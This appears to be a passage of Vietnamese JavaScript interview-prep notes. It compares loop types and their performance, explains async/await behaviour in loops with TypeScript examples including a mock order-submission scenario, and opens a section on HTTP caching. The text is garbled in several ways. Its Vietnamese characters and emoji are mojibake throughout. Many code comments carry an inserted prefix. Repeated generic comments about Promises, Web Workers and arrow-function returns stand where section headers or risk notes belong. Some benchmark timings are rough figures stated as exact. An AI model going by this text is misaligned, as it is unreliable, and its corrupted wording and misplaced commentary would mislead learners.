2. **`for...of`** - Modern, readable üìñ

   - Performance: ‚≠ê‚≠ê‚≠ê‚≠ê (slower than for, faster than forEach)
   - Control: Support break, continue
   - Use case: Readable code, iterables (Array, Set, Map, String)

3. **`forEach`** - Functional style üé®

   - Performance: ‚≠ê‚≠ê‚≠ê (slowest - function call overhead)
   - Control: KH√îNG support break, continue
   - Use case: Functional programming, side effects

4. **`for...in`** - Cho objects üîë

   - Performance: ‚≠ê‚≠ê (slow - prototype chain lookup)
   - Control: Support break, continue
   - Use case: Iterate object keys (KH√îNG n√™n d√πng cho arrays)

5. **`map/filter/reduce`** - Functional transformations üîÑ
   - Performance: ‚≠ê‚≠ê‚≠ê (similar to forEach)
   - Control: KH√îNG support break (ph·∫£i loop h·∫øt array)
   - Use case: Transform data, create new arrays

**‚ö†Ô∏è QUAN TR·ªåNG: Async/Await trong Loops**

**Sequential vs Parallel execution:**

- **Sequential**: Ch·ªù t·ª´ng promise xong m·ªõi ch·∫°y ti·∫øp (slow but controlled)
- **Parallel**: Ch·∫°y t·∫•t c·∫£ promises c√πng l√∫c (fast but less control)

**Ho·∫°t ƒë·ªông:**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ           LOOP PERFORMANCE COMPARISON                  ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                        ‚îÇ
‚îÇ  Synchronous Performance (1M items):                  ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê             ‚îÇ
‚îÇ  ‚îÇ  for loop:        ~2ms   ‚ö°‚ö°‚ö°‚ö°‚ö°    ‚îÇ             ‚îÇ
‚îÇ  ‚îÇ  for...of:        ~5ms   ‚ö°‚ö°‚ö°‚ö°      ‚îÇ             ‚îÇ
‚îÇ  ‚îÇ  forEach:         ~8ms   ‚ö°‚ö°‚ö°        ‚îÇ             ‚îÇ
‚îÇ  ‚îÇ  map:            ~10ms   ‚ö°‚ö°‚ö°        ‚îÇ             ‚îÇ
‚îÇ  ‚îÇ  for...in:       ~50ms   ‚ö°          ‚îÇ             ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò             ‚îÇ
‚îÇ                                                        ‚îÇ
‚îÇ  Async Execution (3 items, 1s delay each):           ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê             ‚îÇ
‚îÇ  ‚îÇ  Sequential (for/for...of): ~3s      ‚îÇ             ‚îÇ
‚îÇ  ‚îÇ  ‚îú‚îÄ Item 1: 1s ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îê          ‚îÇ             ‚îÇ
‚îÇ  ‚îÇ  ‚îú‚îÄ Item 2: 1s           ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îê‚îÇ             ‚îÇ
‚îÇ  ‚îÇ  ‚îî‚îÄ Item 3: 1s                     ‚îÅ‚îÅ‚îÇ             ‚îÇ
‚îÇ  ‚îÇ                                                    ‚îÇ             ‚îÇ
‚îÇ  ‚îÇ  Parallel (Promise.all):   ~1s       ‚îÇ             ‚îÇ
‚îÇ  ‚îÇ  ‚îú‚îÄ Item 1: 1s ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îê          ‚îÇ             ‚îÇ
‚îÇ  ‚îÇ  ‚îú‚îÄ Item 2: 1s ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î§          ‚îÇ             ‚îÇ
‚îÇ  ‚îÇ  ‚îî‚îÄ Item 3: 1s ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îò          ‚îÇ             ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò             ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**∆Øu ƒëi·ªÉm:**

- ‚úÖ **for loop**: Nhanh nh·∫•t, full control (break/continue), cache length
- ‚úÖ **for...of**: Modern, readable, support break/continue, work v·ªõi iterables
- ‚úÖ **forEach**: Functional style, chain methods, readable
- ‚úÖ **Async for...of**: Sequential execution, d·ªÖ control
- ‚úÖ **Promise.all**: Parallel execution, nhanh nh·∫•t cho async

**Nh∆∞·ª£c ƒëi·ªÉm:**

- ‚ùå **for loop**: Verbose, d·ªÖ l·ªói (index out of bounds)
- ‚ùå **for...of**: Ch·∫≠m h∆°n for loop ~2-3x
- ‚ùå **forEach**: Ch·∫≠m nh·∫•t, KH√îNG support break/continue, KH√îNG support async/await
- ‚ùå **for...in**: R·∫§T ch·∫≠m, iterate prototype chain, KH√îNG n√™n d√πng cho arrays
- ‚ùå **Async sequential**: Ch·∫≠m (ch·ªù t·ª´ng promise), kh√¥ng t·∫≠n d·ª•ng concurrency

**Ch√∫ th√≠ch:**

**üîÑ Loop Control Keywords:**

- **`break`**: Tho√°t loop ngay l·∫≠p t·ª©c
- **`continue`**: Skip iteration hi·ªán t·∫°i, ti·∫øp t·ª•c iteration ti·∫øp theo
- **`return`**: Tho√°t function (KH√îNG ch·ªâ loop)

**‚ö° Performance Tips:**

- Cache array length: `const len = arr.length` ‚Üí tr√°nh re-calculate m·ªói iteration
- Avoid nested loops: O(n¬≤) ‚Üí r·∫•t ch·∫≠m v·ªõi large arrays
- Use `for` loop cho performance-critical code (>10K items)
- Use `for...of` cho readable code (trade-off: ~2-3x slower)

**üîÅ Async/Await Behavior:**

- `for`/`for...of`: Support `await` ‚Üí **sequential** execution
- `forEach`: KH√îNG support `await` ƒë√∫ng c√°ch ‚Üí callbacks ch·∫°y **parallel** nh∆∞ng kh√¥ng ƒë·ª£i
- `map` + `Promise.all`: Best practice cho **parallel** async operations
- `for await...of`: D√†nh cho **async iterables** (streams, generators)

**Code Example (TypeScript):**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Hi·ªáu su·∫•t: tr√°nh ch·∫∑n main thread; d√πng Web Worker, chia nh·ªè t√°c v·ª•, t·ªëi ∆∞u reflow/repaint.
 // Ch√∫ gi·∫£i: ============================================

const numbers = [1, 2, 3, 4, 5];

 // Ch√∫ gi·∫£i: üöÄ A. for loop - FASTEST (traditional)
console.time('for loop');
for (let i = 0; i < numbers.length; i++) {
  console.log(numbers[i]);
}
console.timeEnd('for loop'); // Ch√∫ gi·∫£i: ~0.1ms

 // Ch√∫ gi·∫£i: üöÄ B. for loop - OPTIMIZED (cache length)
console.time('for loop optimized');
const len = numbers.length; // Ch√∫ gi·∫£i: ‚úÖ Cache length
for (let i = 0; i < len; i++) {
  console.log(numbers[i]);
}
console.timeEnd('for loop optimized'); // Ch√∫ gi·∫£i: ~0.08ms (faster)

 // Ch√∫ gi·∫£i: üìñ C. for...of - MODERN & READABLE
console.time('for...of');
for (const number of numbers) {
  console.log(number);
 // Ch√∫ gi·∫£i: ‚úÖ Support break, continue
  if (number === 3) break;
}
console.timeEnd('for...of'); // Ch√∫ gi·∫£i: ~0.2ms (2x slower than for)

 // Ch√∫ gi·∫£i: üé® D. forEach - FUNCTIONAL STYLE
console.time('forEach');
numbers.forEach((number, index) => {
  console.log(number);
 // Ch√∫ gi·∫£i: ‚ùå CANNOT use break or continue!
 // Ch√∫ gi·∫£i: if (number === 3) break; // ‚ùå SyntaxError
});
console.timeEnd('forEach'); // Ch√∫ gi·∫£i: ~0.3ms (slowest)

// üîë E. for...in - FOR OBJECTS (KH√îNG n√™n d√πng cho arrays!)
const obj = { a: 1, b: 2, c: 3 };
console.time('for...in');
for (const key in obj) {
  if (obj.hasOwnProperty(key)) {
 // Ch√∫ gi·∫£i: ‚úÖ Check own properties
    console.log(key, obj[key]);
  }
}
console.timeEnd('for...in'); // Ch√∫ gi·∫£i: ~0.5ms (r·∫•t ch·∫≠m v·ªõi arrays)

 // Ch√∫ gi·∫£i: ‚ùå BAD: for...in v·ªõi array
const arr = [1, 2, 3];
for (const index in arr) {
  console.log(index); // '0', '1', '2' (STRING, kh√¥ng ph·∫£i number!)
}

 // Ch√∫ gi·∫£i: üîÑ F. map/filter/reduce - FUNCTIONAL TRANSFORMATIONS
console.time('map');
const doubled = numbers.map((n) => n * 2); // Ch√∫ gi·∫£i: [2, 4, 6, 8, 10]
console.timeEnd('map'); // Ch√∫ gi·∫£i: ~0.3ms

const evens = numbers.filter((n) => n % 2 === 0); // Ch√∫ gi·∫£i: [2, 4]
const sum = numbers.reduce((acc, n) => acc + n, 0); // Ch√∫ gi·∫£i: 15

 // Ch√∫ gi·∫£i: ============================================
 // Hi·ªáu su·∫•t: tr√°nh ch·∫∑n main thread; d√πng Web Worker, chia nh·ªè t√°c v·ª•, t·ªëi ∆∞u reflow/repaint.
 // Ch√∫ gi·∫£i: ============================================

function performanceTest(): void {
  const largeArray = Array.from({ length: 1_000_000 }, (_, i) => i);
  let result = 0;

 // Ch√∫ gi·∫£i: üöÄ for loop - FASTEST
  console.time('for loop (1M items)');
  const len = largeArray.length;
  for (let i = 0; i < len; i++) {
    result += largeArray[i];
  }
  console.timeEnd('for loop (1M items)'); // Ch√∫ gi·∫£i: ~2ms

 // Ch√∫ gi·∫£i: üìñ for...of
  result = 0;
  console.time('for...of (1M items)');
  for (const item of largeArray) {
    result += item;
  }
  console.timeEnd('for...of (1M items)'); // Ch√∫ gi·∫£i: ~5ms (2.5x slower)

 // Ch√∫ gi·∫£i: üé® forEach
  result = 0;
  console.time('forEach (1M items)');
  largeArray.forEach((item) => {
    result += item;
  });
  console.timeEnd('forEach (1M items)'); // Ch√∫ gi·∫£i: ~8ms (4x slower)

 // Ch√∫ gi·∫£i: üîÑ reduce
  console.time('reduce (1M items)');
  result = largeArray.reduce((acc, item) => acc + item, 0);
  console.timeEnd('reduce (1M items)'); // Ch√∫ gi·∫£i: ~10ms (5x slower)

  console.log('Result:', result);
}

performanceTest();

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 3. ASYNC/AWAIT trong LOOPS - QUAN TR·ªåNG! ‚ö†Ô∏è
 // Ch√∫ gi·∫£i: ============================================

// Mock API call (1 gi√¢y delay)
async function fetchUserData(userId: number): Promise<string> {
  console.log(`üöÄ B·∫Øt ƒë·∫ßu fetch user ${userId}...`);
  await new Promise((resolve) => setTimeout(resolve, 1000)); // Ch√∫ gi·∫£i: 1s delay
  console.log(`‚úÖ Ho√†n th√†nh fetch user ${userId}`);
  return `User ${userId} data`;
}

const userIds = [1, 2, 3];

// ‚ùå BAD: forEach v·ªõi async/await - KH√îNG HO·∫†T ƒê·ªòNG ƒê√öNG!
async function badForEach() {
  console.log('‚ùå BAD: forEach v·ªõi async/await');
  console.time('forEach async');

  userIds.forEach(async (id) => {
    const data = await fetchUserData(id); // Ch√∫ gi·∫£i: ‚ùå await b·ªã IGNORE!
    console.log(data);
  });

  console.timeEnd('forEach async'); // ~0ms (KH√îNG ƒë·ª£i promises!)
  console.log('forEach done (nh∆∞ng ch∆∞a fetch xong!)');

  // üö® V·∫•n ƒë·ªÅ:
  // - forEach KH√îNG ƒë·ª£i async callbacks
  // - T·∫•t c·∫£ promises ch·∫°y parallel nh∆∞ng kh√¥ng control ƒë∆∞·ª£c
 // Ch√∫ gi·∫£i: - console.log 'done' ch·∫°y TR∆Ø·ªöC khi fetch xong
}

 // Ch√∫ gi·∫£i: ‚úÖ GOOD: for...of v·ªõi async/await - SEQUENTIAL (Tu·∫ßn t·ª±)
async function goodSequential() {
  console.log('‚úÖ GOOD: for...of - Sequential execution');
  console.time('for...of sequential');

  for (const id of userIds) {
    const data = await fetchUserData(id); // ‚úÖ ƒê·ª£i t·ª´ng promise xong
    console.log(data);
  }

  console.timeEnd('for...of sequential'); // Ch√∫ gi·∫£i: ~3s (1s √ó 3)
  console.log('Sequential done!');

  // ‚úÖ Ho·∫°t ƒë·ªông:
  // 1s: Fetch user 1 ‚Üí ƒë·ª£i xong
  // 1s: Fetch user 2 ‚Üí ƒë·ª£i xong
  // 1s: Fetch user 3 ‚Üí ƒë·ª£i xong
 // Ch√∫ gi·∫£i: Total: 3s
}

 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
async function goodParallel() {
  console.log('‚úÖ BETTER: Promise.all - Parallel execution');
  console.time('Promise.all parallel');

  const promises = userIds.map((id) => fetchUserData(id));
  const results = await Promise.all(promises); // Ch√∫ gi·∫£i: ‚úÖ Ch·∫°y song song

  results.forEach((data) => console.log(data));

  console.timeEnd('Promise.all parallel'); // ~1s (3 requests c√πng l√∫c!)
  console.log('Parallel done!');

  // ‚úÖ Ho·∫°t ƒë·ªông:
  // 0s: Kh·ªüi t·∫°o 3 promises c√πng l√∫c
  // 1s: C·∫£ 3 promises resolve c√πng l√∫c
 // Ch√∫ gi·∫£i: Total: 1s (NHANH G·∫§P 3 L·∫¶N!)
}

 // Ch√∫ gi·∫£i: ‚úÖ ADVANCED: for...of v·ªõi batch processing
async function goodBatch() {
  console.log('‚úÖ ADVANCED: Batch processing');
  console.time('Batch processing');

  const batchSize = 2; // Ch·∫°y 2 requests c√πng l√∫c

  for (let i = 0; i < userIds.length; i += batchSize) {
    const batch = userIds.slice(i, i + batchSize);
    const promises = batch.map((id) => fetchUserData(id));
    const results = await Promise.all(promises); // ƒê·ª£i batch xong

    results.forEach((data) => console.log(data));
  }

  console.timeEnd('Batch processing'); // Ch√∫ gi·∫£i: ~2s
  console.log('Batch done!');

  // ‚úÖ Ho·∫°t ƒë·ªông:
 // Ch√∫ gi·∫£i: Batch 1 (users 1, 2): 1s parallel
 // Ch√∫ gi·∫£i: Batch 2 (user 3):      1s
 // Ch√∫ gi·∫£i: Total: 2s (balance gi·ªØa speed & control)
}

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 4. ASYNC LOOPS - Real-world Trading Example
 // Ch√∫ gi·∫£i: ============================================

interface Order {
  id: number;
  symbol: string;
  quantity: number;
}

 // Ch√∫ gi·∫£i: Mock API: Submit order to exchange
async function submitOrder(order: Order): Promise<string> {
  console.log(`üì§ Submitting order ${order.id}: ${order.symbol}...`);
  await new Promise((resolve) => setTimeout(resolve, 500)); // Ch√∫ gi·∫£i: 500ms delay
  return `Order ${order.id} confirmed`;
}

const orders: Order[] = [
  { id: 1, symbol: 'AAPL', quantity: 100 },
  { id: 2, symbol: 'GOOGL', quantity: 50 },
  { id: 3, symbol: 'MSFT', quantity: 75 },
];

// ‚ùå SCENARIO 1: Sequential (ch·∫≠m nh∆∞ng an to√†n)
async function submitOrdersSequential() {
  console.log('üìä Submitting orders SEQUENTIALLY...');
  console.time('Sequential orders');

  for (const order of orders) {
    const result = await submitOrder(order); // ƒê·ª£i t·ª´ng order
    console.log(`‚úÖ ${result}`);

    // ‚úÖ C√≥ th·ªÉ handle errors t·ª´ng order:
    // if (error) continue; // Skip order l·ªói, ch·∫°y ti·∫øp
  }

  console.timeEnd('Sequential orders'); // Ch√∫ gi·∫£i: ~1.5s (500ms √ó 3)

 // Ch√∫ gi·∫£i: üí° Use case:
 // Ch√∫ gi·∫£i: - Orders ph·ª• thu·ªôc nhau (order 2 c·∫ßn order 1 xong)
  // - Rate limiting (kh√¥ng g·ª≠i qu√° nhi·ªÅu requests)
  // - Error handling ri√™ng t·ª´ng order
}

 // Ch√∫ gi·∫£i: ‚úÖ SCENARIO 2: Parallel (nhanh nh∆∞ng r·ªßi ro)
async function submitOrdersParallel() {
  console.log('üöÄ Submitting orders PARALLEL...');
  console.time('Parallel orders');

  const promises = orders.map((order) => submitOrder(order));
  const results = await Promise.all(promises); // T·∫•t c·∫£ c√πng l√∫c

  results.forEach((result) => console.log(`‚úÖ ${result}`));

  console.timeEnd('Parallel orders'); // ~500ms (t·∫•t c·∫£ c√πng l√∫c!)

 // Ch√∫ gi·∫£i: üí° Use case:
  // - Orders ƒë·ªôc l·∫≠p (kh√¥ng ph·ª• thu·ªôc nhau)
 // Ch√∫ gi·∫£i: - Mu·ªën nhanh nh·∫•t
 // Ch√∫ gi·∫£i: - Exchange support concurrent requests

 // Ch√∫ gi·∫£i: ‚ö†Ô∏è R·ªßi ro:
 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
  // - C√≥ th·ªÉ v∆∞·ª£t rate limit
}

 // Ch√∫ gi·∫£i: ‚úÖ SCENARIO 3: Parallel with error handling
async function submitOrdersParallelSafe() {
  console.log('üõ°Ô∏è Submitting orders PARALLEL (safe)...');
  console.time('Parallel safe orders');

  const promises = orders.map(async (order) => {
    try {
      const result = await submitOrder(order);
      return { status: 'fulfilled', value: result };
    } catch (error) {
      return { status: 'rejected', reason: error };
    }
  });

  const results = await Promise.all(promises);

  results.forEach((result, index) => {
    if (result.status === 'fulfilled') {
      console.log(`‚úÖ ${result.value}`);
    } else {
      console.log(`‚ùå Order ${orders[index].id} failed:`, result.reason);
    }
  });

  console.timeEnd('Parallel safe orders');

  // ‚úÖ L·ª£i √≠ch:
 // Ch√∫ gi·∫£i: - Nhanh (parallel)
  // - 1 order l·ªói KH√îNG ·∫£nh h∆∞·ªüng orders kh√°c
  // - Handle errors ri√™ng t·ª´ng order
}

 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
async function submitOrdersAllSettled() {
  console.log('‚ú® Using Promise.allSettled...');
  console.time('allSettled orders');

  const promises = orders.map((order) => submitOrder(order));
  const results = await Promise.allSettled(promises); // ‚úÖ KH√îNG reject khi c√≥ l·ªói

  results.forEach((result, index) => {
    if (result.status === 'fulfilled') {
      console.log(`‚úÖ ${result.value}`);
    } else {
      console.log(`‚ùå Order ${orders[index].id} failed:`, result.reason);
    }
  });

  console.timeEnd('allSettled orders');
}

 // Ch√∫ gi·∫£i: ============================================
 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
 // Ch√∫ gi·∫£i: ============================================

function loopControl() {
  const numbers = [1, 2, 3, 4, 5];

  // ‚úÖ break: Tho√°t loop ngay l·∫≠p t·ª©c
  console.log('--- break example ---');
  for (const num of numbers) {
    if (num === 3) break; // D·ª´ng khi g·∫∑p 3
    console.log(num); // Ch√∫ gi·∫£i: 1, 2
  }

  // ‚úÖ continue: Skip iteration hi·ªán t·∫°i
  console.log('--- continue example ---');
  for (const num of numbers) {
    if (num === 3) continue; // Ch√∫ gi·∫£i: Skip 3
    console.log(num); // Ch√∫ gi·∫£i: 1, 2, 4, 5
  }

  // ‚úÖ return: Tho√°t function (KH√îNG ch·ªâ loop!)
  console.log('--- return example ---');
  function findNumber(target: number): string {
    for (const num of numbers) {
      if (num === target) {
        return `Found ${target}`; // Tho√°t function
      }
    }
    return 'Not found';
  }
  console.log(findNumber(3)); // Ch√∫ gi·∫£i: 'Found 3'

 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
  console.log('--- forEach (no control) ---');
  numbers.forEach((num) => {
 // Ch√∫ gi·∫£i: if (num === 3) break;    // ‚ùå SyntaxError
 // Ch√∫ gi·∫£i: if (num === 3) continue; // ‚ùå SyntaxError
    if (num === 3) return; // ‚úÖ OK nh∆∞ng ch·ªâ skip iteration n√†y (nh∆∞ continue)
    console.log(num); // Ch√∫ gi·∫£i: 1, 2, 4, 5
  });
}

loopControl();
```

---

**Best Practices:**

1. **Ch·ªçn Loop Type ƒë√∫ng Use Case**

   ```typescript
 // Hi·ªáu su·∫•t: tr√°nh ch·∫∑n main thread; d√πng Web Worker, chia nh·ªè t√°c v·ª•, t·ªëi ∆∞u reflow/repaint.
   for (let i = 0; i < arr.length; i++) {}

 // Ch√∫ gi·∫£i: üìñ Readable code (<100K items)
   for (const item of arr) {
   }

 // Ch√∫ gi·∫£i: üé® Functional transformations
   const doubled = arr.map((x) => x * 2);

 // Ch√∫ gi·∫£i: üîë Objects only
   for (const key in obj) {
   }
   ```

2. **Cache Array Length**

   ```typescript
 // Ch√∫ gi·∫£i: ‚ùå BAD: Re-calculate length m·ªói iteration
   for (let i = 0; i < arr.length; i++) {}

 // Ch√∫ gi·∫£i: ‚úÖ GOOD: Cache length
   const len = arr.length;
   for (let i = 0; i < len; i++) {}
   ```

3. **Async/Await ƒë√∫ng c√°ch**

   ```typescript
 // Ch√∫ gi·∫£i: ‚ùå NEVER use forEach v·ªõi async/await
   arr.forEach(async (item) => {
     await doSomething(item); // KH√îNG ƒë·ª£i!
   });

 // Ch√∫ gi·∫£i: ‚úÖ Sequential: for...of + await
   for (const item of arr) {
     await doSomething(item); // ƒê·ª£i t·ª´ng c√°i
   }

 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
   await Promise.all(arr.map((item) => doSomething(item)));
   ```

4. **Avoid Nested Loops (O(n¬≤))**

   ```typescript
 // Ch√∫ gi·∫£i: ‚ùå BAD: O(n¬≤) - R·∫§T CH·∫¨M
   for (const item1 of arr1) {
     for (const item2 of arr2) {
 // Ch√∫ gi·∫£i: ...
     }
   }

 // Ch√∫ gi·∫£i: ‚úÖ GOOD: Use Map/Set O(n)
   const map = new Map(arr2.map((item) => [item.id, item]));
   for (const item1 of arr1) {
     const item2 = map.get(item1.id); // Ch√∫ gi·∫£i: O(1) lookup
   }
   ```

5. **Error Handling trong Async Loops**

   ```typescript
 // Ch√∫ gi·∫£i: ‚úÖ Sequential: try/catch t·ª´ng operation
   for (const item of items) {
     try {
       await process(item);
     } catch (error) {
       console.error(`Failed to process ${item}:`, error);
       continue; // Skip l·ªói, ch·∫°y ti·∫øp
     }
   }

 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
   const results = await Promise.allSettled(items.map((item) => process(item)));
   ```

---

**Common Mistakes:**

1. **‚ùå forEach v·ªõi async/await**

   ```typescript
 // Ch√∫ gi·∫£i: ‚ùå BAD: await b·ªã IGNORE!
   items.forEach(async (item) => {
     await fetchData(item); // KH√îNG ƒë·ª£i!
   });
   console.log('Done'); // Ch√∫ gi·∫£i: Ch·∫°y TR∆Ø·ªöC khi fetch xong!

   // ‚úÖ GOOD: D√πng for...of
   for (const item of items) {
     await fetchData(item); // ƒê·ª£i ƒë√∫ng
   }
   ```

2. **‚ùå for...in v·ªõi Arrays**

   ```typescript
   // ‚ùå BAD: index l√† STRING, iterate prototype
   const arr = [1, 2, 3];
   for (const index in arr) {
     console.log(typeof index); // Ch√∫ gi·∫£i: 'string'!
   }

   // ‚úÖ GOOD: D√πng for...of
   for (const value of arr) {
     console.log(value); // Ch√∫ gi·∫£i: 1, 2, 3
   }
   ```

3. **‚ùå Kh√¥ng Cache Length**

   ```typescript
   // ‚ùå BAD: arr.length t√≠nh l·∫°i m·ªói iteration
   for (let i = 0; i < arr.length; i++) {}

 // Ch√∫ gi·∫£i: ‚úÖ GOOD: Cache length
   const len = arr.length;
   for (let i = 0; i < len; i++) {}
   ```

4. **‚ùå Nested Loops O(n¬≤)**

   ```typescript
 // Ch√∫ gi·∫£i: ‚ùå BAD: 1000 √ó 1000 = 1,000,000 iterations!
   for (const user of users) {
 // Ch√∫ gi·∫£i: 1000 users
     for (const order of orders) {
 // Ch√∫ gi·∫£i: 1000 orders
       if (order.userId === user.id) {
       }
     }
   }

 // Ch√∫ gi·∫£i: ‚úÖ GOOD: O(n) v·ªõi Map
   const ordersByUser = new Map();
   orders.forEach((order) => {
     if (!ordersByUser.has(order.userId)) {
       ordersByUser.set(order.userId, []);
     }
     ordersByUser.get(order.userId).push(order);
   });

   users.forEach((user) => {
     const userOrders = ordersByUser.get(user.id); // Ch√∫ gi·∫£i: O(1)
   });
   ```

5. **‚ùå Promise.all m√† kh√¥ng handle errors**

   ```typescript
 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
   await Promise.all(items.map((item) => fetchData(item)));

   // ‚úÖ GOOD: D√πng Promise.allSettled
   const results = await Promise.allSettled(
     items.map((item) => fetchData(item))
   );

   results.forEach((result, i) => {
     if (result.status === 'rejected') {
       console.error(`Item ${i} failed:`, result.reason);
     }
   });
   ```

---
---
## 20. üíæ Q20: Handle Caching - HTTP Caching & Browser Cache Strategies  

**P1: T√™n c√¢u h·ªèi:** üíæ Q20: Handle Caching - HTTP Caching & Browser Cache Strategies  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (2-3 ph√∫t):**

**"HTTP caching = gi·∫£m y√™u c·∫ßu server b·∫±ng Cache-Control, ETag. Service Worker = h·ªó tr·ª£ offline.**

**üì¶ Lo·∫°i Cache & Ph√¢n C·∫•p:**
1. **Memory Cache**: Trong b·ªô nh·ªõ RAM ‚Üí nhanh nh·∫•t, x√≥a khi ƒë√≥ng tab.
2. **Disk Cache**: Tr√™n ·ªï ƒëƒ©a ‚Üí duy tr√¨ qua c√°c phi√™n.
